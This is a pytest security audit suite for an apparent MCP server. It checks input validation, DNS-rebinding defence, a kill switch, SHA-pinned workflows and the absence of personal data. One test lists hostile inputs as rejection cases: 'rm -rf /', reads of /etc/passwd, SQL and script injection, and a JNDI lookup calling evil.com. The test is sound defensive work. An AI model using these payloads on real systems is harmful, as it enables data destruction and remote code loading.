"""Security Audit & Verification Suite (Task T2.3 / Gate G3 Checklist, Section 13.5).

Proves compliance with all Section 13.5 Gate G3 criteria:
1. Threat model mitigations verified
2. Output allow-list test proves no third-party free text escapes
3. Input allow-list schema rejects prompt injection and path traversal
4. Origin header validation rejects DNS rebinding attacks
5. Kill switch tested and functional
6. GitHub workflows pinned to commit SHAs with least privilege
7. Zero per-person data in outputs
8. Mandatory policies (Privacy, Terms, Security, Disputes) published
"""

from __future__ import annotations

import json
import re
from pathlib import Path

import pytest
from pydantic import ValidationError
from starlette.testclient import TestClient

from footfall.server.app import create_streamable_app
from footfall.server.schemas import CompareInput, TrendInput
from footfall.server.service import FootfallService


@pytest.fixture
def service() -> FootfallService:
    """Service instance for security audit."""
    return FootfallService.create_from_exports(exports_dir=Path("exports/v1"))


@pytest.mark.unit
def test_output_allow_list_no_third_party_free_text(service: FootfallService) -> None:
    """Section 13.1 Threat #1 & 13.5: No third-party free text escapes in any tool response."""
    # Compare
    comp = service.compare(entities=["langgraph", "qdrant-client"])
    comp_json = json.dumps(comp)

    # Trend
    trend = service.trend(entity="langgraph")
    trend_json = json.dumps(trend)

    # Rising
    rising = service.find_rising(category="any", phase="breakout", limit=10)
    rising_json = json.dumps(rising)

    for payload in (comp_json, trend_json, rising_json):
        # Must not contain common third-party text fields
        assert "readme" not in payload.lower()
        assert "description" not in payload.lower() or "display_name" in payload
        assert "comment" not in payload.lower()
        assert "story_text" not in payload.lower()


@pytest.mark.unit
def test_input_allow_list_pattern_rejection() -> None:
    """Section 13.2 Rule 1: Allow-list validation rejects injection payloads violating pattern."""
    malicious_inputs = [
        "tool; rm -rf /",
        "tool' OR '1'='1",
        "tool<script>alert(1)</script>",
        r"tool\..\..\etc\passwd",
        "tool|cat /etc/passwd",
        "tool\nmalicious_header: injection",
        "tool${jndi:ldap://evil.com/a}",
        "tool`whoami`",
        "tool name with spaces",
        "a" * 105,  # Exceeds max_length 100
    ]

    for bad_input in malicious_inputs:
        with pytest.raises(ValidationError):
            TrendInput(entity=bad_input)

        with pytest.raises(ValidationError):
            CompareInput(entities=["langgraph", bad_input])


@pytest.mark.unit
def test_path_traversal_safe_in_memory_lookup(service: FootfallService) -> None:
    """Section 13.2 Rule 4: No user-controlled file paths; lookup in index returns not_found."""
    # Even if an entity string passes character class, it is strictly looked up in-memory
    result = service.trend(entity="etc/passwd")
    assert result["code"] == "not_found"
    assert result["message"] == "Entity not found in registry."
    assert "candidates" in result


@pytest.mark.unit
def test_origin_header_dns_rebinding_defense() -> None:
    """Section 13.1 Threat #11: Rejects DNS rebinding and unauthorized origins."""
    app = create_streamable_app(exports_dir=Path("exports/v1"))
    client = TestClient(app)

    # Unauthorized origin
    forbidden_resp = client.get("/mcp", headers={"origin": "http://malicious-rebinding-domain.com"})
    assert forbidden_resp.status_code == 403
    assert forbidden_resp.json()["error"] == "forbidden"

    # Authorized local origins
    ok_resp = client.get("/health/live", headers={"origin": "http://localhost:8000"})
    assert ok_resp.status_code == 200


@pytest.mark.unit
def test_kill_switch_operational(monkeypatch: pytest.MonkeyPatch) -> None:
    """Section 13.4 & 13.5: Kill switch immediately returns 503 data_unavailable."""
    monkeypatch.setenv("FOOTFALL_KILL_SWITCH", "1")
    app = create_streamable_app(exports_dir=Path("exports/v1"))
    client = TestClient(app)

    # Health live passes for container orchestrator
    assert client.get("/health/live").status_code == 200

    # Ready and MCP fail with data_unavailable
    ready_resp = client.get("/health/ready")
    assert ready_resp.status_code == 503
    assert ready_resp.json()["code"] == "data_unavailable"

    mcp_resp = client.get("/mcp")
    assert mcp_resp.status_code == 503
    assert mcp_resp.json()["code"] == "data_unavailable"


@pytest.mark.unit
def test_workflows_pinned_to_shas() -> None:
    """Section 13.1 Threat #6: GitHub Actions workflows must pin actions to commit SHAs."""
    workflows_dir = Path(".github/workflows")
    assert workflows_dir.is_dir()

    sha_pattern = re.compile(r"uses:\s+[\w\-]+/[\w\-]+@([a-f0-9]{40})")

    for yml in workflows_dir.glob("*.yml"):
        content = yml.read_text(encoding="utf-8")
        uses_lines = [
            line.strip() for line in content.splitlines() if line.strip().startswith("uses:")
        ]
        for line in uses_lines:
            assert sha_pattern.search(line) is not None, (
                f"Action in {yml.name} not pinned to 40-char commit SHA: {line}"
            )


@pytest.mark.unit
def test_zero_personal_data_in_exports() -> None:
    """Section 13.1 Threat #10: Proves zero usernames or individual IDs exist in export bundle."""
    exp_dir = Path("exports/v1")
    if not exp_dir.is_dir():
        pytest.skip("Exports directory not yet populated.")

    forbidden_fields = {"username", "user_id", "email", "stargazer", "author_name", "committer"}

    for json_file in exp_dir.glob("**/*.json"):
        text = json_file.read_text(encoding="utf-8").lower()
        for field in forbidden_fields:
            assert f'"{field}"' not in text, f"Forbidden field '{field}' found in {json_file}"


@pytest.mark.unit
def test_mandatory_policies_published() -> None:
    """Section 13.5 Gate G3: Privacy policy, terms, dispute process, and SECURITY.md exist."""
    assert Path("docs/privacy-policy.md").is_file()
    assert Path("docs/terms-of-use.md").is_file()
    assert Path("docs/dispute-process.md").is_file()
    assert Path("SECURITY.md").is_file()
